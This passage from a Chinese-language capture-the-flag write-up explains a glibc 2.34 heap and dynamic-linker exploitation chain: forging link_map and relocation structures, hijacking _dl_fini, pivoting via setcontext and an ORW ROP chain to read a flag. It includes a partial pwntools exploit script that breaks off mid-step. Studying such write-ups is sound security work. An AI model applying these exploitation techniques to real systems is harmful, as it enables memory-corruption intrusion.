        struct link_map *l = maps[i];
        if (l->l_init_called)
            ... // 呼叫 destructor
    }
    ...
}
```



到這邊已經在 `write@got` 寫入 `_dl_fini()` 的 function address，同時我們也分析完 resolving 相關的 function。

---

### 4. setup arbitrary call primitive

有了步驟 1~3 的建置，我們已經可以構造出呼叫任意 function 的 primitive 了，參考下方執行 `_dl_fini()` 的注意事項：

```c
for (i = 0; i < nmaps; ++i)
{
    struct link_map *l = maps[i];
    if (l->l_init_called)
    {
		// 確保不會執行兩次
        l->l_init_called = 0;
        if (l->l_info[DT_FINI_ARRAY] != NULL || l->l_info[DT_FINI] != NULL)
        {
	        // 我們的目標為 old style destructor，l->l_info[DT_FINI_ARRAY] 設為 NULL 即可
            if (l->l_info[DT_FINI_ARRAY] != NULL)
            	{ ... /* call destructor array */ }

			// old style destructor
            if (l->l_info[DT_FINI] != NULL)
                // rdi 剛好會存放 _rtld_global._dl_load_lock 的位址
                DL_CALL_DT_FINI(l, l->l_addr + l->l_info[DT_FINI]->d_un.d_ptr);
        }
    }
	...
    --l->l_direct_opencount;
}
```

- `l->l_info[DT_FINI]` 被我們竄改成 `l->l_info[DT_DEBUG]`，因此 `l->l_info[DT_FINI]->d_un.d_ptr` 取出來的值就是 `_r_debug` 的位址，我們只要控制 `l->l_addr` 就能執行任意 function
- 而在呼叫 `DL_CALL_DT_FINI()` 時，rdi 剛好會放 `_rtld_global._dl_load_lock` 的位址，所以如果需要 string 參數的話，只需要將資料寫入 `_rtld_global._dl_load_lock` 即可
- 構造完後，我們只需要把 `l->l_init_called` 設成 1 即可



需要注意的是，在 `_dl_fini()` 當中會使用 lock 來避免 concurrent 的 object load / unload：

```c
void _dl_fini(void)
{
    ...
    for (Lmid_t ns = GL(dl_nns) - 1; ns >= 0; --ns)
    {
        // 實際上會呼叫到 pthread_mutex_lock()
        __rtld_lock_lock_recursive(GL(dl_load_lock));
        ...
    }
    ...
}
```

在 `pthread_mutex_lock()` ([src](https://elixir.bootlin.com/glibc/glibc-2.34/source/nptl/pthread_mutex_lock.c#L72)) 當中會去判斷 lock 的 type 來做出對應的行為，`dl_load_lock` 的 type 為 `PTHREAD_MUTEX_RECURSIVE_NP`，下面為處理此種 type 的 lock 的程式碼：

```c
else if (__builtin_expect (PTHREAD_MUTEX_TYPE (mutex)
			     == PTHREAD_MUTEX_RECURSIVE_NP, 1))
    {
      pid_t id = THREAD_GETMEM (THREAD_SELF, tid);

      if (mutex->__data.__owner == id) // 檢查是否為我們擁有 lock
	{
	  /* Just bump the counter.  */
	  if (__glibc_unlikely (mutex->__data.__count + 1 == 0))
	    /* Overflow of the counter.  */
	    return EAGAIN;

	  ++mutex->__data.__count;

	  return 0;
	}

      LLL_MUTEX_LOCK_OPTIMIZED (mutex);
      assert (mutex->__data.__owner == 0); // <----------
      mutex->__data.__count = 1;
    }
```

在一些情況下 `assert()` 會不通過而導致程式終止，因此我們要避免此種情況發生，解決方法很簡單，只需要將 type 改成一個無效的 type，最後就會進入下方程式碼：

```c
  if (__builtin_expect (type & ~(PTHREAD_MUTEX_KIND_MASK_NP
				 | PTHREAD_MUTEX_ELISION_FLAGS_NP), 0))
    return __pthread_mutex_lock_full (mutex);
```

而 `__pthread_mutex_lock_full()` 為所有 lock type 的處理，但是因為我們 lock 非合法的 type，因此最後只會回傳 error code：

```c
static int
__pthread_mutex_lock_full (pthread_mutex_t *mutex)
{
  int oldval;
  pid_t id = THREAD_GETMEM (THREAD_SELF, tid);

  switch (PTHREAD_MUTEX_TYPE (mutex))
    {
      ...
      default:
      /* Correct code cannot set any other type.  */
      	return EINVAL;
    }
}
```

這樣就不會讓 lock 的操作影響接下來的行為。

改之前的 `_rtld_global._dl_load_lock`：

```shell
$2 = {
  mutex = {
    __data = {
      __lock = 0,
      __count = 0,
      __owner = 0,
      __nusers = 0,
      __kind = 1,
      __spins = 0,
      __elision = 0,
      __list = {
        __prev = 0x0,
        __next = 0x0
      }
    },
    __size = '\000' <repeats 16 times>, "\001", '\000' <repeats 22 times>,
    __align = 0
  }
}
```

改之後的 `_rtld_global._dl_load_lock`，成員 `__kind` 被設成 255：

```shell
$7 = {
  mutex = {
    __data = {
      __lock = 0,
      __count = 0,
      __owner = 0,
      __nusers = 0,
      __kind = 255, # invalid
      __spins = 0,
      __elision = 0,
      __list = {
        __prev = 0x0,
        __next = 0x0
      }
    },
    __size = '\000' <repeats 16 times>, "\377", '\000' <repeats 22 times>,
    __align = 0
  }
}
```

---

### 5. create symbol table

有了任意呼叫 function 的 primitive 之後，再來我們要構造出可控的 `malloc()` 以及 `free()` 的 primitive，之後的 exploit 會需要 `malloc()` 以及 `free()` 來產生合法的 pointer，讓我們能構造正常的 link_map。



`malloc()` 我們利用 `_IO_str_overflow()`，在控制 `_IO_FILE` 的情況下可以呼叫任意 size 的 `malloc(size)`：

```c
#define _IO_blen(fp) ((fp)->_IO_buf_end - (fp)->_IO_buf_base)

_IO_str_overflow(FILE *fp, int c)
{
    int flush_only = c == EOF;
    size_t pos;
    // 由於 flag 是空的，因此下方 if (fp->_flags & XXX) 的 condition 都不會執行
    if (fp->_flags & _IO_NO_WRITES)
        return flush_only ? 0 : EOF;
    if ((fp->_flags & _IO_TIED_PUT_GET) && !(fp->_flags & _IO_CURRENTLY_PUTTING))
    { ... }
    pos = fp->_IO_write_ptr - fp->_IO_write_base; // pos = 0
    if (pos >= (size_t)(_IO_blen(fp) + flush_only)) // 0 >= 0
    {
        if (fp->_flags & _IO_USER_BUF) return EOF;
        else
        {
            char *new_buf;
            char *old_buf = fp->_IO_buf_base;
            size_t old_blen = _IO_blen(fp);
            // 如果要 malloc(size)，則 old_blen 需要是 (size - 100) / 2
            size_t new_size = 2 * old_blen + 100;
            if (new_size < old_blen) return EOF;
            new_buf = malloc(new_size);
            if (new_buf == NULL)
				return EOF;
           	if (old_buf) { ... /* 不會進來 */ };
            memset(new_buf + old_blen, '\0', new_size - old_blen);

            _IO_setb(fp, new_buf, new_buf + new_size, 1);
            fp->_IO_read_base = new_buf + (fp->_IO_read_base - old_buf);
            fp->_IO_read_ptr = new_buf + (fp->_IO_read_ptr - old_buf);
            fp->_IO_read_end = new_buf + (fp->_IO_read_end - old_buf);
            fp->_IO_write_ptr = new_buf + (fp->_IO_write_ptr - old_buf);

            fp->_IO_write_base = new_buf;
            fp->_IO_write_end = fp->_IO_buf_end;
        }
    }

    if (!flush_only)
        *fp->_IO_write_ptr++ = (unsigned char)c;
    if (fp->_IO_write_ptr > fp->_IO_read_end)
        fp->_IO_read_end = fp->_IO_write_ptr;
    return c;
}
```

- 如果要 `malloc(size)`，則 old_blen 需要是 `(size - 100) / 2`
- 在呼叫完後，相關 buffer pointer 會被設置，保存在 `(struct *IO_FILE*) _rtld_global._dl_load_lock` 當中，而成員 `_IO_read_ptr` 正好會是新的 chunk 的位址



`free()` 的部分用 `_IO_str_finish()`：

```c
void
_IO_str_finish (FILE *fp, int dummy)
{
  	if (fp->_IO_buf_base && !(fp->_flags & _IO_USER_BUF))
		free(fp->_IO_buf_base); // fp->_IO_buf_base 指向 malloc() 分配的 chunk
	fp->_IO_buf_base = NULL;
  	_IO_default_finish (fp, 0);
}
```

進到 `free()` 當中：

```c
void __libc_free(void *mem)
{
	...
    p = mem2chunk(mem);
    if (chunk_is_mmapped(p)) // 由於改掉 metadata 而 mmap bit 被 unset 的關係，不會進入此 condition
    { ... }
    else
    {
        ...
        _int_free(ar_ptr, p, 0);
    }
    ...
}
```

進到 `_int_free()` 之後：

```c
_int_free()
{
    // 由於 get_max_fast
	if ((unsigned long)(size) <= (unsigned long)(get_max_fast()))
    {
        // 為了確保不進入此 condition，因此必須要建構下一個 fake chunk
        if (
            __builtin_expect (chunksize_nomask (chunk_at_offset (p, size)) <= CHUNK_HDR_SZ, 0)
            || __builtin_expect (chunksize (chunk_at_offset (p, size)) >= av->system_mem, 0) { ... /* abort */ }
        ...
        fb = &fastbin(av, idx);
        mchunkptr old = *fb, old2;
        if (SINGLE_THREAD_P)
        {
            if (__builtin_expect(old == p, 0)) // 避免 double free
                malloc_printerr("double free or corruption (fasttop)");
            p->fd = PROTECT_PTR(&p->fd, old);
            *fb = p; // 放到 fastbin 當中
        }
        else
            ...
    }
    else if (!chunk_is_mmapped(p)) { ... }
}
```

- 由於我們改了 `global_max_fast`，使得 `get_max_fast()` 回傳的值大過當前要釋放的 chunk，因此 chunk 會被放進 fastbin 當中

- 不過 `get_max_fast()` 裡面會檢查 `global_max_fast` 是否合法，但 optimization 把它優化掉了，所以事實上不會檢查：

  ```c
  static inline INTERNAL_SIZE_T
  get_max_fast (void)
  {
    /* ...
       (The code never executes because malloc preserves the
       global_max_fast invariant, but the optimizers may not recognize
       this.)  */
    if (global_max_fast > MAX_FAST_SIZE)
      __builtin_unreachable ();
    return global_max_fast;
  }
  ```



因為我們所 `mmap()` 的大塊 chunk 可以**當作 fastbin chunk 存起來**，這可以讓我們**能在 `main_arena.fastbinsY` 下方寫 pointer** (fastbinsY 會存放對應 index 的 fastbin chunk)，在算出目標位址與  `main_arena.fastbinsY` 的相對位址後，產生符合大小的 chunk，**最後放到 fastbin 時就會在目標位址寫上一個 pointer**，實際算法在 exploit 當中的 `gmf_size()` function 有提到。



再來我們可以透過 `_IO_switch_to_backup_area()` 交換 read / save buffer：

```c
void _IO_switch_to_backup_area(FILE *fp)
{
    char *tmp;
    fp->_flags |= _IO_IN_BACKUP;
    /* Swap _IO_read_end and _IO_save_end. */
    tmp = fp->_IO_read_end;
    fp->_IO_read_end = fp->_IO_save_end;
    fp->_IO_save_end = tmp;
    /* Swap _IO_read_base and _IO_save_base. */
    tmp = fp->_IO_read_base;
    fp->_IO_read_base = fp->_IO_save_base;
    fp->_IO_save_base = tmp;
    /* Set _IO_read_ptr.  */
    fp->_IO_read_ptr = fp->_IO_read_end;
}
```



交換完後透過 `_IO_free_backup_area()` 釋放 `fp->_IO_save_base`，因為先前呼叫 `_IO_switch_to_backup_area()` 的關係，實際 `fp->_IO_save_base` 會是先前透過 `malloc()` 分配的 chunk 的位址 (old `_IO_read_ptr`)：

```c
#define _IO_in_backup(fp) ((fp)->_flags & _IO_IN_BACKUP)

void _IO_free_backup_area(FILE *fp)
{
    if (_IO_in_backup(fp)) ...;
    free(fp->_IO_save_base);
    fp->_IO_save_base = NULL;
    fp->_IO_save_end = NULL;
    fp->_IO_backup_base = NULL;
}
```

- 如果竄改 chunk 的 metadata，讓此塊被視為 tcache chunk，在呼叫 `free(fp->_IO_save_base)` 後 chunk 就可以被放到 tcache 當中



`__open_memstream()` 此 function 用來開啟一個 memory stream，將從 stream 讀進來的 data 寫到 malloc buffer 當中，而其中執行過程會呼叫 `malloc(0x1f8)`，若先前控制 fake tcache chunk 時，可以將大小控制在 `0x200`，在這邊就會拿到那塊記憶體：

```c
FILE *
__open_memstream(char **bufloc, size_t *sizeloc)
{
    struct locked_FILE
    {
        struct _IO_FILE_memstream fp;
        _IO_lock_t lock;
        struct _IO_wide_data wd;
    } * new_f;
    char *buf;

    // sizeof(struct locked_FILE) == 0x1f8，因此會拿到 free 掉的 mmap chunk
    new_f = (struct locked_FILE *)malloc(sizeof(struct locked_FILE));
    if (new_f == NULL)
        return NULL;
    #ifdef _IO_MTSAFE_IO
    	// 在此會 assign lock value
    	// &new_f->fp._sf._sbf._f._lock == 0x155555241098
    	// &new_f->lock == 0x155555241110
    	new_f->fp._sf._sbf._f._lock = &new_f->lock;
    #endif
    ...
    _IO_init_internal(&new_f->fp._sf._sbf._f, 0);
    _IO_JUMPS_FILE_plus(&new_f->fp._sf._sbf) = &_IO_mem_jumps;
    _IO_str_init_static_internal(&new_f->fp._sf, buf, BUFSIZ, buf);
    ... // setup
    new_f->fp.bufloc = bufloc; // 此位址會在 offset 0x100 的地方寫下傳進的參數 bufloc
    // 而實際上 bufloc 也就是 fake_linkmap (_rtld_global._dl_load_lock) 的位址
    return (FILE *)&new_f->fp._sf._sbf;
}
```

- 在執行完後，`fake_linkmap->l_info[DT_SYMTAB] + 0x100` 剛好會有一個 `&fake_linkmap`，而 `fake_linkmap->l_info[DT_SYMTAB] + 0x90` 的地方會有指向 `fake_linkmap->l_info[DT_SYMTAB] + 0x110` 的 pointer
- 我們讓 `fake_linkmap->l_info[DT_SYMTAB] += 0x90`，使得新的 `fake_linkmap->l_info[DT_SYMTAB].dun.d_ptr` 指向 `fake_linkmap->l_info[DT_SYMTAB] + 0x110`



透過 `__open_memstream()` 拿到的 chunk 當中會有 FILE 相關的 pointer 可以讓我們使用，我們可以用來建構 symbol table，此部分參考程式碼當中的註解。

---

### 6. setup the fake link_map

在建構 symbol table 後，我們還需要為 `l_info[]` 建立其他的 chunk，避免存取到非法的 pointer。由於 `linkmap` 的使用只在呼叫 `_dl_fixup()` 的時候，因此不需要所有的 `l_info[]` 都建構完，只需構造出部分的即可，在此省略分配的過程，詳情可以參考 exploit 的操作與註解，最後建置好的 `l_info[]` 相關資料如下，如果沒有列出來則代表不需要：

```shell
# DT_PLTGOT (3): 0x155555119000
{
  d_tag = 0,
  d_un = {
    d_val = 0,
    d_ptr = 0
  }
}
# DT_STRTAB (5): 0x1555551ad000
{
  d_tag = 0,
  d_un = {
    d_val = 605089,
    d_ptr = 605089
  }
}
# DT_SYMTAB (6): 0x155555241090
{
  d_tag = 0,
  d_un = {
    d_val = 0x155555241110,
    d_ptr = 0x155555241110
  }
}
# DT_JMPREL (23): 0x155555553ff8
{
  d_tag = 0,
  d_un = {
    d_val = 0x155555086000,
    d_ptr = 0x155555086000
  }
}
```



後續就能透過製造 fake symbol table entry 以及 rela 結構來解析任意位址，在此之前再看一次相關結構以及用途：

```c
typedef struct
{
  Elf64_Addr	r_offset;		/* Address */
  Elf64_Xword	r_info;			/* Relocation type and symbol index */
  Elf64_Sxword	r_addend;		/* Addend */
} Elf64_Rela;

typedef struct
{
  Elf64_Word	st_name;		/* Symbol name (string tbl index) */
  unsigned char	st_info;		/* Symbol type and binding */
  unsigned char st_other;		/* Symbol visibility */
  Elf64_Section	st_shndx;		/* Section index */
  Elf64_Addr	st_value;		/* Symbol value */
  Elf64_Xword	st_size;		/* Symbol size */
} Elf64_Sym;
```



Review `_dl_fixup()`：

```c
_dl_fixup(struct link_map *l, ElfW(Word) reloc_arg)
{
    // symtab = l->l_info[DT_SYMTAB].d_un.d_ptr
    const ElfW(Sym) *const symtab = (const void *)D_PTR(l, l_info[DT_SYMTAB]);
    // strtab = l->l_info[DT_STRTAB].d_un.d_ptr
    const char *strtab = (const void *)D_PTR(l, l_info[DT_STRTAB]);
	// pltgot = l->l_info[DT_PLTGOT].d_un.d_ptr
    const uintptr_t pltgot = (uintptr_t)D_PTR(l, l_info[DT_PLTGOT]);
	// reloc = l->l_info[DT_JMPREL].d_un.d_ptr + 0x18 * reloc_arg
    const PLTREL *const reloc = (const void *)(D_PTR(l, l_info[DT_JMPREL]) + reloc_offset(pltgot, reloc_arg));
    // sym = &symtab[ R_SYM(reloc->r_info) ]
    const ElfW(Sym) *sym = &symtab[ELFW(R_SYM)(reloc->r_info)];
    const ElfW(Sym) *refsym = sym;
    // rel_addr = l->l_addr + reloc->r_offset
    void *const rel_addr = (void *)(l->l_addr + reloc->r_offset);
    lookup_t result;

	... // 在此我們不需要透過字串去解析對應的 function 位址，因此 sym->st_other 要設成 0
    if (__builtin_expect(ELFW(ST_VISIBILITY)(sym->st_other), 0) == 0)
    { ... /* 動態解析還沒載入的 symbol */ }
    else
    {
        // 已經有 symbol 了
        // value = l->l_addr + sym->st_value
        value = DL_FIXUP_MAKE_VALUE(l, SYMBOL_ADDRESS(l, sym, true));
        result = l;
    }
	...
    // *rel_addr = value
    return elf_machine_fixup_plt(l, result, refsym, sym, reloc, rel_addr, value);
}
```

而我們只需要構造 `Elf64_Sym` 與 `Elf64_Rela` 如下：

```shell
Elf64_Rela
{
  r_offset = where - offset_chunk_and_l_addr + 0x10,
  r_info = 0x000000007,
  r_addend = 0
}

Elf64_Sym
{
  st_name = 0,
  st_info = 18 '\022',
  st_other = 1 '\001',
  st_shndx = 0,
  st_value = what - offset_chunk_and_l_addr + 0x10,
  st_size = 0,
}
```

配合知道相對位址的 `l_info[]`，最後可以做到給予與變數 `chunk` 的相對位址 A 與 B，將 A 的絕對位址寫到 B 當中：

```c
symtab = l->l_info[DT_SYMTAB].d_un.d_ptr; // 0x155555241090 -> 0x155555241110
strtab = l->l_info[DT_STRTAB].d_un.d_ptr; // 0x1555551ad000 -> 0x93ba1 (we don't care)
pltgot = l->l_info[DT_PLTGOT].d_un.d_ptr; // 0x155555119000 -> 0x93b81 (we don't care)
// 0x155555086000 + 0x18 * 1 == 0x155555086000
reloc = l->l_info[DT_JMPREL].d_un.d_ptr + 0x18 * reloc_arg;
// 0x155555241110 + 0x18 * 0 == 0x155555241110
sym = symtab[ reloc->r_info ];
// l->l_addr + where - offset_chunk_and_l_addr + 0x10 == target_addr
rel_addr = l->l_addr + reloc->r_offset;
// l->l_addr + what - offset_chunk_and_l_addr + 0x10 == target_value
value = l->l_addr + sym->st_value;
// *target_addr = target_value, same as *A = B
*rel_addr = value;
```

---

### 7. setup stack pivoting gadget and ORW rop chain

在此我們有了**任意寫** (use fake linkmap) + **任意執行** (controlable `_dl_fini()`)，接下來就是構造 ROP chain，此 ROP chain 分成兩個部分：

- 透過 `setcontext+61` gadget 做 stack pivoting 遷移 stack
- 構造 ORW chain 來讀取 flag



用來做 stack pivoting 的 `setcontext+61` gadget：

```shell
<setcontext+61>:      mov    rsp,QWORD PTR [rdx+0xa0]
<setcontext+68>:      mov    rbx,QWORD PTR [rdx+0x80]
<setcontext+75>:      mov    rbp,QWORD PTR [rdx+0x78]
<setcontext+79>:      mov    r12,QWORD PTR [rdx+0x48]
<setcontext+83>:      mov    r13,QWORD PTR [rdx+0x50]
<setcontext+87>:      mov    r14,QWORD PTR [rdx+0x58]
<setcontext+91>:      mov    r15,QWORD PTR [rdx+0x60]
<setcontext+95>:      test   DWORD PTR fs:0x48,0x2
<setcontext+107>:     je     XXX <setcontext+294>
...
<setcontext+294>:     mov    rcx,QWORD PTR [rdx+0xa8]
<setcontext+301>:     push   rcx
<setcontext+302>:     mov    rsi,QWORD PTR [rdx+0x70]
<setcontext+306>:     mov    rdi,QWORD PTR [rdx+0x68]
<setcontext+310>:     mov    rcx,QWORD PTR [rdx+0x98]
<setcontext+317>:     mov    r8,QWORD PTR [rdx+0x28]
<setcontext+321>:     mov    r9,QWORD PTR [rdx+0x30]
<setcontext+325>:     mov    rdx,QWORD PTR [rdx+0x88]
<setcontext+332>:     xor    eax,eax
<setcontext+334>:     ret
```

如果我們可以控制 rdx 的內容，就可以控制所有的 register value，不過 rdx 為第三個參數，因此我們需要找一個能透過 rdi 去控制 rdx 的 gadget：

```shell
<getkeyserv_handle+528>:      mov    rdx,QWORD PTR [rdi+0x8]
<getkeyserv_handle+532>:      mov    QWORD PTR [rsp],rax
<getkeyserv_handle+536>:      call   QWORD PTR [rdx+0x20]
```

此 gadget 取出 `[rdi+8]` 到 rdx 並呼叫 `[rdi+0x20]`，我們只需要傳入 " `[rdi+8]` 為自己、`[rdi+0x20]` 為 target function " 的 rdi 即可，相較之下 ORW 的 ROP 構造就是普通的 ORW。



## 8. Win

最後 exploit 如下：

```python
#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']
SLEEP_TIME = 0.01

r = process('./N', env={"LD_PRELOAD": "/usr/src/glibc/glibc_dbg_2.34/libc.so"}, aslr=False)
e = ELF('./N')
ld = ELF('/tmp/nightmare/ld.so')
libc = ELF('/usr/src/glibc/glibc_dbg_2.34/libc.so')
load_sym = "add-symbol-file /usr/src/glibc/glibc_dbg_2.34/libc.so 0x1555553446c0"

# ld / libc 與跟一開始 mmap 出來的 "chunk" 的 offset
ld.address = 0x24d000 - 0x10
libc.address = 0x43000 - 0x10

# 參考： https://elixir.bootlin.com/glibc/glibc-2.34/source/elf/elf.h#L855
d_tag = {
    'DT_PLTGOT' : 3,
    'DT_STRTAB' : 5,
    'DT_SYMTAB' : 6,
    'DT_FINI' : 13,
    'DT_DEBUG' : 21,
    'DT_JMPREL' : 23,
    'DT_FINI_ARRAY' : 26,
    'DT_FINI_ARRAYSZ' : 28,
    'DT_VER' : 50,
}
l_info_noaslr = {
    0x555555557ec8, # 3 (DT_PLTGOT)
    0x555555557e78, # 5 (DT_STRTAB)
    0x555555557e88, # 6 (DT_SYMTAB)
    0x555555557e18, # 13 (DT_FINI)
    0x555555557eb8, # 21 (DT_DEBUG)
    0x555555557ef8, # 23 (DT_JMPREL)
    0x555555557e48, # 26 (DT_FINI_ARRAY)
    0x555555557e58, # 28 (DT_FINI_ARRAYSZ)
    0x555555557e68, # 50 (DT_VER)
}
l_info_last_byte = {
    'DT_PLTGOT': 0xc8, # 3
    'DT_STRTAB': 0x78, # 5
    'DT_SYMTAB': 0x88, # 6
    'DT_FINI': 0x18, # 13
    'DT_DEBUG': 0xb8, # 21
    'DT_JMPREL': 0xf8, # 23
    'DT_FINI_ARRAY': 0x48, # 26
    'DT_FINI_ARRAYSZ': 0x58, # 28
    'DT_VER': 0x68, # 50
}
ld_l_info_last_byte = {
    'DT_PLTGOT': 0xe0, # 3
}

# 參考： https://elixir.bootlin.com/glibc/glibc-2.34/source/libio/bits/types/struct_FILE.h#L49
class io_obj:
    def __init__(self, offset):
        self.offset = offset

    def _flags(self):
        return self.offset

    def _IO_save_end(self):
        return self.offset + 0x58

# 參考： https://elixir.bootlin.com/glibc/glibc-2.34/source/sysdeps/generic/ldsodefs.h#L307
class rtld_global:
    def __init__(self, offset):
        self.offset = offset

    def _base(self):
        return self.offset

    def _dl_load_lock(self):
        return self.offset + 0x988

    def _dl_load_lock__kind(self):
        return self.offset + 0x988 + 0x10

    def _dl_stack_used(self):
        return self.offset + 0x988

    def _dl_rtld_map(self):
        return self.offset + 0xA08

# 參考： https://elixir.bootlin.com/glibc/glibc-2.34/source/include/link.h#L95
class link_map:
    def __init__(self, offset):
        self.offset = offset

    def _base(self):
        return self.offset

    def l_addr(self):
        return ld.address + self.offset

    def l_info(self, tag):
        return ld.address + self.offset + 0x40 + tag * 8

    def l_init_called(self):
        return self.l_addr() + 0x31C

def write(off, bz):
    for i, b in enumerate(bz):
        sleep( SLEEP_TIME )
        r.send(p64(off + i, signed=True))
        sleep( SLEEP_TIME )
        r.send(p8(b))

# 參考： https://elixir.bootlin.com/glibc/glibc-2.34/source/elf/elf.h#L663
def elf64_rela(r_offset, r_info, r_addend):
    return p64(r_offset) + p64(r_info) + p64(r_addend, signed=True)
# 參考： https://elixir.bootlin.com/glibc/glibc-2.34/source/elf/elf.h#L527
def elf64_sym(st_name, st_info, st_other, st_shndx, st_value, st_size):
    return p32(st_name) + p8(st_info) + p8(st_other) + p16(st_shndx) + p64(st_value) + p64(st_size)

elf64_rela_size = len(elf64_rela(0,0,0))
elf64_sym_size = len(elf64_sym(0,0,0,0,0,0))

# ld base 與 executable 的 link_map 的 offset
binary_map = link_map(0x33220)
# ld base 與 ld 的 link_map 的 offset 
ld_map = link_map(0x32a48)
# _rtld_global 存放 ld 的 global data
_rtld_global = rtld_global(ld.symbols["_rtld_global"])


info(f"""\
# STEP.0
## Executable
DT_STRTAB:            0x555555554500
DT_SYMTAB:            0x5555555543e0
binary link_map:      p (*(struct link_map *) 0x155555555220)

## ld
DT_STRTAB:            0x1555555227b0
DT_SYMTAB:            0x1555555224b0
ld link_map:          p (*(struct link_map *) 0x155555554a48)

## other
struct rela size:     {hex(elf64_rela_size)}
struct sym size:      {hex(elf64_sym_size)}
show heapinfo:        heapinfo 0x15555550ac60

# STEP.4
fake_linkmap addr:    p (*(struct link_map *) 0x1555555549c8)
fake_io addr:         p (*(struct _IO_FILE *) 0x1555555549c8)

# STEP.5
main_arena:           p (*(struct malloc_state *) 0x15555550ac60)
global_max_fast:      x/gx 0x1555555121c0
__open_memstream():   p *(struct _IO_FILE_memstream *) 0x155555241010
""")

########### STEP 1. 將 write 解析到 _Exit@got 達到不限次數限制的寫 ###########
gotoff__Exit_write = e.got["_Exit"] - e.got["write"]
write(binary_map.l_addr(), p8(gotoff__Exit_write))



########### STEP 2. 清除版本資訊避免影響結果以及恢復 write function 的解析 ###########
# 透過竄改 last byte，讓 DT_JMPREL (Relocation table) / DT_SYMTAB (Symbol table) 指向 DT_DEBUG (_r_debug)
# 這樣就能構造出假的 Elf64_Rela entry 以及 Elf64_Sym entry
def set_rela_table(table):
    write(ld.symbols["_r_debug"], table)
    write(binary_map.l_info(d_tag['DT_JMPREL']), p8(l_info_last_byte['DT_DEBUG']))

def restore_rela_table():
    write(binary_map.l_info(d_tag['DT_JMPREL']), p8(l_info_last_byte['DT_JMPREL']))

write_sym_idx = 2
def set_sym_table(table):
    write(ld.symbols["_r_debug"] + elf64_sym_size * write_sym_idx, table)
    write(binary_map.l_info(d_tag['DT_SYMTAB']), p8(l_info_last_byte['DT_DEBUG']))

def restore_sym_table():
    write(binary_map.l_info(d_tag['DT_SYMTAB']), p8(l_info_last_byte['DT_SYMTAB']))

# 原本 r_offset 從 0x4018 變成 0x4100，只是單純讓之後解析的位址不要寫到 write@GOT 即可，確保每次都能進入 _dl_fixup
set_rela_table(elf64_rela(0x4100, 0x7 + (write_sym_idx << 32), 0))
# 使得 _dl_fixup 解析到 st_info 為 1 的 symbol entry，並且 write@got 被寫入 _init function，而此 function 什麼事情都不會做
set_sym_table(elf64_sym(0, 0x12, 1, 0, e.symbols['_init'] - gotoff__Exit_write, 0))
# 清除 l->l_info[VERSYMIDX (DT_VERSYM)]
write(binary_map.l_info(d_tag['DT_VER']), p64(0))
# 先恢復 Symbol table 再恢復 Relocation table
restore_sym_table()
restore_rela_table()



########### STEP 3. 解析 ld 的 _dl_fini function 並寫到 write@got ###########
# 當 l_init_called 非為 0 時，_dl_fini 會去呼叫 fini function
def enable_fini_function():
    write(binary_map.l_init_called(), p8(0xff))
# 而當 l_init_called 為 0 時，_dl_fini 會以為 fini function 已經呼叫完
def disable_fini_function():
    write(binary_map.l_init_called(), p8(0))

disable_fini_function()
_dl_x86_get_cpu_features_sym_idx = 0x8
_dl_x86_get_cpu_features_strtab_offset = 0x166
# 任意在 dl 當中選一個 function symbol "A" 並取得其 Elf64_Sym 的結構。而後我們在 DT_DEBUG 中建立假的 Symbol table entry，
# 幾乎所有的欄位都與 "A" 的 Elf64_Sym 相同，但假的 "A" Elf64_Sym 的 st_value 需要是 _dl_fini 的 offset，
# 這樣在 _dl_fixup 解析 "A" 後會把 _dl_fini 認為是 function 的位址而寫入 GOT 當中並執行
# 在這個 exploit 當中 "A" 即是 function "_dl_x86_get_cpu_features"

#### 構造假的 fake Elf64_Sym ####
# ld 的 l_info[ DT_PLTGOT ] 與 _GLOBAL_OFFSET_TABLE_ 位址相同，因此我們先在 _GLOBAL_OFFSET_TABLE_ 建立假的 "A" Elf64_Sym
write(ld.symbols["_GLOBAL_OFFSET_TABLE_"] + elf64_sym_size * _dl_x86_get_cpu_features_sym_idx,
        elf64_sym(0x166, 0x12, 0, 0xc, ld.symbols["_dl_fini"] - ld.address, 0xb))
# 之後把 ld 的 l_info[ DT_SYMTAB ] 的最後一個 byte 改成 l_info[ DT_PLTGOT ]，這樣呼叫 "A" 時解析到的就會是我們構造的 "A" Elf64_Sym
write(ld_map.l_info(d_tag['DT_SYMTAB']), p8(ld_l_info_last_byte['DT_PLTGOT']))

#### 讓 write@plt 在透過 _dl_fixup 解析 function 時，誤以為 string entry 指向 "_dl_x86_get_cpu_features" ####
write_strtab_offset = 0x4b
# write 會從 Elf64_Sym 取出 string offset，並 string table 當中找到對應 offset 的 string，
# 這次把 l_info[ DT_DEBUG ] 當做假的 string table，因此要在 write Elf64_Sym 所紀錄的 string offset
# 寫入 "_dl_x86_get_cpu_features"，這樣 dl 就會以為 write function 的名字叫做 "_dl_x86_get_cpu_features"，
# 藉此就會去解析看有哪個 object 裡面有 "_dl_x86_get_cpu_features" function，這時候就會找到 ld，
# 而 ld 中紀錄 "_dl_x86_get_cpu_features" 對應到的 Symbol table entry 也被我們修改了，
# 所以在解析完後，實際上回傳的並不是 _dl_x86_get_cpu_features 的位址，而是 _dl_fini
write(ld.symbols["_r_debug"] + write_strtab_offset, b"_dl_x86_get_cpu_features")
# 一將 l_info[ DT_DEBUG ] 視為 l_info[ DT_STRTAB ] 後，_exit@got 就會被解析成 _dl_fini
write(binary_map.l_info(d_tag['DT_STRTAB']), p8(l_info_last_byte['DT_DEBUG']))
# 因為此時 _exit@got 存放 _dl_fini，因此不再需要 l_addr 的 offset，恢復 l_addr 後 _dl_fini 就會被解析到 write@got
write(binary_map.l_addr(), p8(0))



########### STEP 4. 透過 _dl_fini 構造任意呼叫的 primitive ###########
# 讓 l_info[ DT_FINI ] 指向 l_info[ DT_DEBUG ]
write(binary_map.l_info(d_tag['DT_FINI']), p8(l_info_last_byte['DT_DEBUG']))
# 我們只想控制 DT_FINI function，因此將 l_info[ DT_FINI_ARRAY ] 清成 NULL
write(binary_map.l_info(d_tag['DT_FINI_ARRAY']), p64(0))
# 必須將 _rtld_global._dl_load_lock_._kind 設為 invalid type，這樣才不會因為 _dl_fini 的 mutex lock 處理讓程式 crash
def make_mutex_invalid():
    write(_rtld_global._dl_load_lock__kind(), p8(0xff))
make_mutex_invalid()
# 在 _rtld_global._dl_load_lock_ 建立一個假的 link_map，因為我們只能透過 _dl_fini 的 fini function 來呼叫 function，
# 而呼叫時 rdi 會指向 _rtld_global._dl_load_lock_，代表這塊記憶體區塊會同時為多個 struct，以供不同的 function call 傳遞參數
fake_linkmap = link_map(_rtld_global._dl_load_lock() - ld.address)
